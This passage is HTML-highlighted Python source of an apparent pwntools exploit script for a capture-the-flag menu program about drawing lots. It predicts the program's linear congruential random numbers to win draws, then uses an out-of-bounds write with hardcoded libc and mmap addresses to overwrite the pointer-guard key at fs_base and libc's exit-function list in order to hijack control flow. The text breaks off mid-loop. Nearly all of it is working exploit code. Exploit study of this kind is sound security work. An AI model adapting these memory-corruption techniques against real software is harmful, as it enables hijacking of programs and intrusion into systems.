+<span class="n">srh</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">elf</span><span class="o">=</span><span class="bp">None</span><span class="p">:</span> <span class="nf">gelf</span><span class="p">(</span><span class="n">elf</span><span class="p">).</span><span class="nf">search</span><span class="p">(</span><span class="nf">byt</span><span class="p">(</span><span class="n">x</span><span class="p">)).</span><span class="nf">__next__</span><span class="p">()</span>
+<span class="n">sasm</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">elf</span><span class="o">=</span><span class="bp">None</span><span class="p">:</span> <span class="nf">gelf</span><span class="p">(</span><span class="n">elf</span><span class="p">).</span><span class="nf">search</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="nf">__next__</span><span class="p">()</span>
+<span class="n">lsrh</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nf">srh</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">libc</span><span class="p">)</span>
+<span class="n">lasm</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nf">sasm</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">libc</span><span class="p">)</span>
+
+<span class="c1"># cyclic aliases
+</span><span class="n">cyc</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nf">cyclic</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="n">cfd</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nf">cyclic_find</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="n">cto</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nf">cyc</span><span class="p">(</span><span class="nf">cfd</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
+
+<span class="c1"># tube aliases
+</span><span class="n">t</span> <span class="o">=</span> <span class="bp">None</span>
+<span class="n">gt</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">at</span><span class="o">=</span><span class="bp">None</span><span class="p">:</span> <span class="n">at</span> <span class="k">if</span> <span class="n">at</span> <span class="k">else</span> <span class="n">t</span>
+<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">t</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">:</span> <span class="nf">gt</span><span class="p">(</span><span class="n">t</span><span class="p">).</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">byt</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+<span class="n">se</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">t</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">:</span> <span class="nf">gt</span><span class="p">(</span><span class="n">t</span><span class="p">).</span><span class="nf">send</span><span class="p">(</span><span class="nf">byt</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+<span class="n">ss</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">t</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">:</span> <span class="p">(</span>
+    <span class="nf">sl</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">s</span>
+    <span class="k">else</span> <span class="nf">se</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span> <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">==</span> <span class="n">s</span> <span class="k">else</span> <span class="nf">lerr</span><span class="p">(</span><span class="sh">"</span><span class="s">ss to big: %#x &gt; %#x</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="n">s</span><span class="p">))</span>
+<span class="p">)</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">t</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">:</span> <span class="nf">gt</span><span class="p">(</span><span class="n">t</span><span class="p">).</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">byt</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="nf">byt</span><span class="p">(</span><span class="n">y</span><span class="p">),</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">t</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">:</span> <span class="nf">gt</span><span class="p">(</span><span class="n">t</span><span class="p">).</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">byt</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="nf">byt</span><span class="p">(</span><span class="n">y</span><span class="p">),</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+<span class="n">sas</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">t</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">:</span> <span class="p">(</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">y</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">s</span>
+    <span class="nf">else </span><span class="p">(</span>
+        <span class="nf">sa</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+        <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">y</span><span class="p">)</span> <span class="o">==</span> <span class="n">s</span>
+        <span class="k">else</span> <span class="nf">lerr</span><span class="p">(</span><span class="sh">"</span><span class="s">ss to big: %#x &gt; %#x</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="n">s</span><span class="p">))</span>
+    <span class="p">)</span>
+<span class="p">)</span>
+<span class="n">ra</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">t</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">:</span> <span class="nf">gt</span><span class="p">(</span><span class="n">t</span><span class="p">).</span><span class="nf">recvall</span><span class="p">(</span><span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+<span class="n">rl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">t</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">:</span> <span class="nf">gt</span><span class="p">(</span><span class="n">t</span><span class="p">).</span><span class="nf">recvline</span><span class="p">(</span><span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+<span class="n">rls</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">t</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">:</span> <span class="nf">rl</span><span class="p">(</span><span class="n">t</span><span class="o">=</span><span class="n">t</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">rcv</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">t</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">:</span> <span class="nf">gt</span><span class="p">(</span><span class="n">t</span><span class="p">).</span><span class="nf">recv</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+<span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">t</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">:</span> <span class="nf">gt</span><span class="p">(</span><span class="n">t</span><span class="p">).</span><span class="nf">recvuntil</span><span class="p">(</span><span class="nf">byt</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+<span class="n">it</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">t</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">:</span> <span class="nf">gt</span><span class="p">(</span><span class="n">t</span><span class="p">).</span><span class="nf">interactive</span><span class="p">(</span><span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+<span class="n">cl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">t</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">:</span> <span class="nf">gt</span><span class="p">(</span><span class="n">t</span><span class="p">).</span><span class="nf">close</span><span class="p">(</span><span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+<span class="n">WRITE</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">DRAW</span> <span class="o">=</span> <span class="mi">2</span>
+<span class="n">GET</span> <span class="o">=</span> <span class="mi">3</span>
+<span class="n">EXIT</span> <span class="o">=</span> <span class="mi">4</span>
+
+
+<span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>
+
+
+<span class="c1"># good luck pwning :)
+</span><span class="k">def</span> <span class="nf">write_lot</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">num</span><span class="p">):</span>
+    <span class="k">if</span> <span class="nf">type</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span><span class="p">:</span>
+        <span class="n">num</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">num</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span>
+    <span class="nf">menu</span><span class="p">(</span><span class="n">WRITE</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+
+        <span class="nf">se</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nf">se</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span>
+    <span class="c1"># print(len(num), num)
+</span>    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">:</span>
+        <span class="nf">sa</span><span class="p">(</span><span class="sh">"</span><span class="s">number :</span><span class="sh">"</span><span class="p">,</span> <span class="n">num</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">))</span>
+        <span class="nf">sa</span><span class="p">(</span><span class="sh">"</span><span class="s">number :</span><span class="sh">"</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">num</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>
+        <span class="k">assert</span> <span class="nf">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">==</span> <span class="mi">8</span><span class="p">,</span> <span class="sh">"</span><span class="s">Number must be exactly 8 bytes long</span><span class="sh">"</span>
+        <span class="nf">sa</span><span class="p">(</span><span class="sh">"</span><span class="s">number :</span><span class="sh">"</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
+
+    <span class="c1"># print("Wrote lot at index", idx, "with number", num)
+</span>
+
+<span class="k">def</span> <span class="nf">draw_lot</span><span class="p">(</span><span class="n">com</span><span class="o">=</span><span class="sh">""</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">LAST_VALUE</span>
+    <span class="nf">menu</span><span class="p">(</span><span class="n">DRAW</span><span class="p">)</span>
+    <span class="k">if</span> <span class="sa">b</span><span class="sh">"</span><span class="s">Congratulation</span><span class="sh">"</span> <span class="ow">in</span> <span class="nf">rls</span><span class="p">():</span>
+        <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">com</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">:</span>
+            <span class="n">com</span> <span class="o">=</span> <span class="n">com</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">sa</span><span class="p">(</span><span class="sh">"</span><span class="s">please :</span><span class="sh">"</span><span class="p">,</span> <span class="n">com</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="nf">find_rng_seed</span><span class="p">(</span><span class="n">LAST_VALUE</span><span class="p">))</span>
+        <span class="n">LAST_VALUE</span> <span class="o">=</span> <span class="nf">find_rng_seed</span><span class="p">(</span><span class="n">LAST_VALUE</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="nf">get_lucky</span><span class="p">())</span>
+        <span class="nf">print</span><span class="p">(</span><span class="nf">find_rng_seed</span><span class="p">(</span><span class="n">LAST_VALUE</span><span class="p">))</span>
+        <span class="n">LAST_VALUE</span> <span class="o">=</span> <span class="nf">find_rng_seed</span><span class="p">(</span><span class="n">LAST_VALUE</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="nf">get_lucky</span><span class="p">())</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Failed to draw lot</span><span class="sh">"</span><span class="p">)</span>
+        <span class="k">raise</span> <span class="nc">EOFError</span><span class="p">(</span><span class="sh">"</span><span class="s">Failed to draw lot, maybe wrong input?</span><span class="sh">"</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">get_lucky</span><span class="p">():</span>
+    <span class="nf">menu</span><span class="p">(</span><span class="n">GET</span><span class="p">)</span>
+    <span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">lucky number is </span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">lucky</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">rls</span><span class="p">())</span>
+    <span class="k">return</span> <span class="n">lucky</span>
+
+
+<span class="k">def</span> <span class="nf">win_lot</span><span class="p">(</span><span class="n">idx</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">LAST_VALUE</span>
+
+    <span class="n">real_aa</span> <span class="o">=</span> <span class="nf">find_rng_seed</span><span class="p">(</span><span class="n">LAST_VALUE</span><span class="p">)</span>
+    <span class="n">LAST_VALUE</span> <span class="o">=</span> <span class="n">real_aa</span>
+    <span class="n">aa</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">real_aa</span><span class="p">).</span><span class="nf">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>
+    <span class="c1"># print(aa)
+</span>    <span class="k">if</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x0a</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">aa</span> <span class="ow">or</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">aa</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Invalid number, contains newline character</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">LAST_VALUE</span> <span class="o">=</span> <span class="nf">get_lucky</span><span class="p">()</span>
+        <span class="nf">win_lot</span><span class="p">(</span><span class="n">idx</span><span class="o">=</span><span class="n">idx</span><span class="p">)</span>
+        <span class="k">return</span>
+
+    <span class="nf">write_lot</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="n">real_aa</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">find_rng_seed</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
+    <span class="nf">return </span><span class="p">((</span><span class="n">value</span> <span class="o">*</span> <span class="mi">1103515245</span><span class="p">)</span> <span class="o">+</span> <span class="mi">12345</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7FFFFFFF</span>
+
+
+<span class="n">rol</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">val</span><span class="p">,</span> <span class="n">r_bits</span><span class="p">,</span> <span class="n">max_bits</span><span class="p">:</span> <span class="p">(</span><span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="n">r_bits</span> <span class="o">%</span> <span class="n">max_bits</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="n">max_bits</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span>
+    <span class="p">(</span><span class="n">val</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="n">max_bits</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">max_bits</span> <span class="o">-</span> <span class="p">(</span><span class="n">r_bits</span> <span class="o">%</span> <span class="n">max_bits</span><span class="p">))</span>
+<span class="p">)</span>
+
+
+<span class="n">LIBC_BASE</span> <span class="o">=</span> <span class="mh">0x79934B380000</span>
+<span class="n">INITIAL</span> <span class="o">=</span> <span class="n">LIBC_BASE</span> <span class="o">+</span> <span class="mh">0x21BF00</span>
+<span class="n">FS_BASE</span> <span class="o">=</span> <span class="mh">0x15555550F000</span> <span class="o">+</span> <span class="mh">0x740</span>
+<span class="n">FS_BASE</span> <span class="o">=</span> <span class="mh">0x79934B37D000</span> <span class="o">+</span> <span class="mh">0x740</span>
+
+<span class="n">off</span> <span class="o">=</span> <span class="mh">0x2000</span>
+<span class="n">tries</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">LAST_VALUE</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">tries</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+
+        <span class="n">MMAP_BASE</span> <span class="o">=</span> <span class="mh">0x155555551000</span> <span class="o">+</span> <span class="n">off</span>
+        <span class="n">MMAP_BASE</span> <span class="o">=</span> <span class="mh">0x79934B5E5000</span> <span class="o">+</span> <span class="n">off</span>
+        <span class="n">t</span> <span class="o">=</span> <span class="nf">conn</span><span class="p">()</span>
+        <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
+        <span class="n">val1</span> <span class="o">=</span> <span class="nf">get_lucky</span><span class="p">()</span>
+        <span class="nf">print</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">MMAP_BASE</span> <span class="o">-</span> <span class="n">FS_BASE</span> <span class="o">+</span> <span class="mh">0x740</span><span class="p">))</span>
+        <span class="nf">print</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">MMAP_BASE</span> <span class="o">-</span> <span class="n">LIBC_BASE</span><span class="p">))</span>
+
+        <span class="n">LAST_VALUE</span> <span class="o">=</span> <span class="n">val1</span>
+
+        <span class="n">key</span> <span class="o">=</span> <span class="mh">0x7F7F7F7F7F7F7F7F</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">prepisujeme fs_base</span><span class="sh">"</span><span class="p">)</span>
+
+        <span class="n">OFFSET</span> <span class="o">=</span> <span class="p">((</span><span class="n">FS_BASE</span> <span class="o">+</span> <span class="mh">0x30</span> <span class="o">-</span> <span class="n">MMAP_BASE</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">OFFSET: </span><span class="si">{</span><span class="n">OFFSET</span><span class="si">:</span><span class="c1">#x</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+
+        <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span><span class="p">)</span>
+        <span class="nf">win_lot</span><span class="p">()</span>
+        <span class="nf">draw_lot</span><span class="p">(</span><span class="n">com</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+        <span class="nf">write_lot</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">):</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Exploit started, writing exit function list and type...</span><span class="sh">"</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+            <span class="n">MMAP_BASE</span> <span class="o">+=</span> <span class="n">off</span> <span class="o">*</span> <span class="n">i</span>
+            <span class="n">OFFSET</span> <span class="o">=</span> <span class="p">((</span><span class="n">INITIAL</span> <span class="o">-</span> <span class="n">MMAP_BASE</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">OFFSET: </span><span class="si">{</span><span class="n">OFFSET</span><span class="si">:</span><span class="c1">#x</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+            <span class="c1"># write initial fncs cnt
+</span>            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">zaciname</span><span class="sh">"</span><span class="p">)</span>
+            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
+                <span class="n">n_fncs</span> <span class="o">=</span> <span class="mi">9</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">n_fncs</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x41</span><span class="sh">"</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+                <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+                <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+                <span class="nf">win_lot</span><span class="p">()</span>
+                <span class="nf">draw_lot</span><span class="p">(</span><span class="n">com</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+                <span class="nf">write_lot</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+            <span class="c1"># write exit function-&gt;type
+</span>            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
+                <span class="n">fnc_type</span> <span class="o">=</span> <span class="mi">4</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fnc_type</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x41</span><span class="sh">"</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+                <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+                <span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">OFFSET</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span>
+
+                <span class="nf">win_lot</span><span class="p">()</span>
+                <span class="nf">draw_lot</span><span class="p">(</span><span class="n">com</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+                <span class="nf">write_lot</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+            <span class="c1"># posledny win
+</span>            <span class="c1"># sem sa napise
+</span>
+            <span class="c1"># write exit function-&gt;type
+</span>            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
+                <span class="n">fnc_type</span> <span class="o">=</span> <span class="mi">4</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fnc_type</span><span class="p">)</span>
